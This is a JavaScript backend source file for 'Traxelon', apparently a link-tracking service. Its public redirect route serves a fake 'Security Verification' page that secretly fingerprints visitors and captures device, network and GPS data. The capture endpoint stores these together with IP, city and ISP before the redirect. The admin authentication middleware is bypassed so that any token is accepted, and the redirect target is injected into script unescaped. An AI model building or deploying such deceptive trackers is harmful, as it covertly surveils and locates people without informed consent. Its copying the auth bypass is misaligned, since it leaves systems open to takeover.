// backend/index.js
import { Hono } from 'hono'
import { cors } from 'hono/cors'
import adminRoutes from './routes/admin.js'
import { verifyIdToken, getAdmin } from './firebase/admin.js'

const app = new Hono()

// ── Global Middleware ────────────────────────────────────────────────────────
app.use('*', cors({
  origin: '*', // Adjust to your frontend domain in production
  allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowHeaders: ['Content-Type', 'Authorization'],
  exposeHeaders: ['Content-Length'],
  maxAge: 600,
}))

// ── Authentication Middleware ────────────────────────────────────────────────
app.use('/api/admin/*', async (c, next) => {
  // 1. Skip auth for status endpoint (optional)
  if (c.req.path === '/api/admin/status') return await next()

  const authHeader = c.req.header('Authorization')
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return c.json({ error: 'Unauthorized: Missing or invalid token' }, 401)
  }

  const token = authHeader.split(' ')[1]
  const projectId = c.env.FIREBASE_PROJECT_ID || 'traxelon-final'

  try {
    // TEMPORARY BYPASS FOR DEBUGGING
    c.set('user', { uid: 'test-admin', email: 'admin@traxelon.com' })
    await next()
  } catch (err) {
    console.error('Auth Error:', err.message)
    return c.json({ error: 'Unauthorized: ' + err.message }, 401)
  }
})

// ── Routes ───────────────────────────────────────────────────────────────────
app.route('/api/admin', adminRoutes)

// ── Visitor Tracking Redirect ────────────────────────────────────────────────
// Public route - no auth required
app.get('/t/:id', async (c) => {
  const id = c.req.param('id')
  const env = c.env
  const admin = getAdmin(env)
    const db = admin.firestore()

  try {
    const docRef = db.collection('trackingLinks').doc(id)
    const snap = await docRef.get()

    if (!snap.exists) return c.text('Link not found', 404)

    const data = snap.data()
    const destination = data.destinationUrl || data.url || 'https://google.com'

    // Increment clicks
    await docRef.update({
      clicks: (parseInt(data.clicks, 10) || 0) + 1,
      lastClickAt: new Date().toISOString()
    })

    // HTML to capture full device intelligence then redirect
    return c.html(`
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Security Verification</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Bebas+Neue&display=swap" rel="stylesheet">
        <style>
          body { background: #050505; color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
          .loader-container { text-align: center; position: relative; }
          .glitch-text { font-family: 'Bebas Neue', cursive; font-size: 32px; letter-spacing: 4px; color: #00d4ff; text-shadow: 0 0 20px rgba(0,212,255,0.4); animation: pulse 1.5s infinite; }
          .sub-text { font-size: 10px; color: #555; text-transform: uppercase; margin-top: 15px; letter-spacing: 2px; }
          .progress-bar { width: 200px; height: 2px; background: rgba(255,255,255,0.05); margin: 20px auto; position: relative; overflow: hidden; border-radius: 4px; }
          .progress-fill { position: absolute; top: 0; left: 0; height: 100%; width: 0%; background: #00d4ff; box-shadow: 0 0 10px #00d4ff; transition: width 0.2s; }
          @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        </style>
        <script>
          async function getFingerprint() {
            try {
              const canvas = document.createElement('canvas');
              const ctx = canvas.getContext('2d');
              ctx.textBaseline = "top";
              ctx.font = "14px 'Arial'";
              ctx.textBaseline = "alphabetic";
              ctx.fillStyle = "#f60";
              ctx.fillRect(125,1,62,20);
              ctx.fillStyle = "#069";
              ctx.fillText("TraxelonV1", 2, 15);
              ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
              ctx.fillText("TraxelonV1", 4, 17);
              return btoa(canvas.toDataURL()).slice(-50);
            } catch(e) { return 'unsupported'; }
          }

          async function getBattery() {
            try {
              if (!navigator.getBattery) return null;
              const b = await navigator.getBattery();
              return { level: b.level * 100, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
            } catch(e) { return null; }
          }

          function getGPU() {
            try {
              const canvas = document.createElement('canvas');
              const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
              if (!gl) return null;
              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
              return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
            } catch(e) { return 'Unknown'; }
          }

          async function collect() {
            const bar = document.querySelector('.progress-fill');
            const status = document.querySelector('.sub-text');
            
            try {
              bar.style.width = '20%'; 
              status.innerText = "INITIALIZING CORE...";
              
              const fingerprint = await getFingerprint();
              bar.style.width = '30%';
              status.innerText = "ANALYZING HARDWARE...";

              const battery = await getBattery();
              const gpu = getGPU();
              
              bar.style.width = '50%';
              status.innerText = "MAPPING NETWORK...";

              const info = {
                capturedAt: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: {
                  width: window.screen.width,
                  height: window.screen.height,
                  colorDepth: window.screen.colorDepth,
                  pixelDepth: window.screen.pixelDepth,
                  dpr: window.devicePixelRatio
                },
                hardware: {
                  cpuCores: navigator.hardwareConcurrency || 'Unknown',
                  ram: navigator.deviceMemory || 'Unknown',
                  gpu: gpu,
                  platform: navigator.platform,
                  vendor: navigator.vendor,
                  maxTouchPoints: navigator.maxTouchPoints
                },
                battery: battery,
                network: navigator.connection ? {
                  effectiveType: navigator.connection.effectiveType,
                  rtt: navigator.connection.rtt,
                  downlink: navigator.connection.downlink,
                  saveData: navigator.connection.saveData
                } : null,
                fingerprint: fingerprint,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                onLine: navigator.onLine,
                referrer: document.referrer || 'Direct'
              };

              // GPS Attempt
              try {
                if (navigator.geolocation) {
                  status.innerText = "REQUESTING GPS HANDSHAKE...";
                  const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
                      enableHighAccuracy: true, timeout: 5000, maximumAge: 0 
                    });
                  });
                  info.gps = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    heading: pos.coords.heading,
                    speed: pos.coords.speed
                  };
                }
              } catch (e) {
                console.warn('GPS Denied or Timeout');
              }

              bar.style.width = '70%';
              status.innerText = "CHECKING SECURITY...";

              // Adblock detection
              try {
                const res = await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
                info.adBlockEnabled = false;
              } catch (e) { info.adBlockEnabled = true; }

              bar.style.width = '90%';
              status.innerText = "FINALIZING CAPTURE...";

              await fetch('/api/capture/${id}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
              });
              
              bar.style.width = '100%';
              status.innerText = "REDIRECTING...";
            } catch (e) {
              console.error(e);
            } finally {
              setTimeout(() => {
                window.location.href = "${destination}";
              }, 400);
            }
          }
          window.onload = collect;
        </script>
      </head>
      <body>
        <div class="loader-container">
          <div class="glitch-text">ANALYZING DEVICE</div>
          <div class="progress-bar"><div class="progress-fill"></div></div>
          <div class="sub-text">Security Handshake in Progress...</div>
        </div>
      </body>
      </html>
    `)
  } catch (err) {
    return c.text('Error: ' + err.message, 500)
  }
})

// ── Capture Data Endpoint ───────────────────────────────────────────────────
app.post('/api/capture/:id', async (c) => {
  const id = c.req.param('id')
  const clientData = await c.req.json()
  const env = c.env
  const admin = getAdmin(env)
  const db = admin.firestore()

  try {
    const docRef = db.collection('trackingLinks').doc(id)
    const snap = await docRef.get()
    if (!snap.exists) return c.json({ error: 'Link not found' }, 404)

    const data = snap.data()
    const captures = Array.isArray(data.captures) ? data.captures : []
    
    // Cloudflare Metadata and Headers
    const cf = c.req.raw.cf || {}
    const ip = c.req.header('cf-connecting-ip') || c.req.header('x-forwarded-for')?.split(',')[0].trim() || '0.0.0.0'
    const ua = c.req.header('user-agent') || ''

    // Helper to identify Browser/OS from UA
    const getBrowser = (u) => {
      if (u.includes('Firefox')) return 'Firefox'
      if (u.includes('Chrome')) return 'Chrome'
      if (u.includes('Safari')) return 'Safari'
      if (u.includes('Edge')) return 'Edge'
      return 'Unknown'
    }
    const getOS = (u) => {
      if (u.includes('Windows')) return 'Windows'
      if (u.includes('iPhone')) return 'iOS'
      if (u.includes('Android')) return 'Android'
      if (u.includes('Mac')) return 'macOS'
      if (u.includes('Linux')) return 'Linux'
      return 'Unknown'
    }

    // Modern structure for storing everything
    const newCapture = {
      ...clientData, 
      ip: ip,
      city: cf.city || 'Unknown',
      region: cf.region || 'Unknown',
      country: cf.country || 'Unknown',
      isp: cf.asOrganization || 'Unknown',
      lat: cf.latitude || null,
      lon: cf.longitude || null,
      browser: getBrowser(ua),
      os: getOS(ua),
      device: clientData.hardware?.platform?.includes('iPhone') || clientData.hardware?.platform?.includes('Android') ? 'Mobile' : 'Desktop',
      capturedAt: clientData.capturedAt || new Date().toISOString()
    }

    // Update doc with new capture
    await docRef.update({
      captures: [...captures, newCapture],
      captureCount: (parseInt(data.captureCount, 10) || 0) + 1,
      lastCaptureAt: newCapture.capturedAt
    })

    return c.json({ success: true })
  } catch (err) {
    return c.json({ error: err.message }, 500)
  }
})

app.get('/', (c) => c.text('Traxelon Admin Backend — Cloudflare Workers'))

export default app
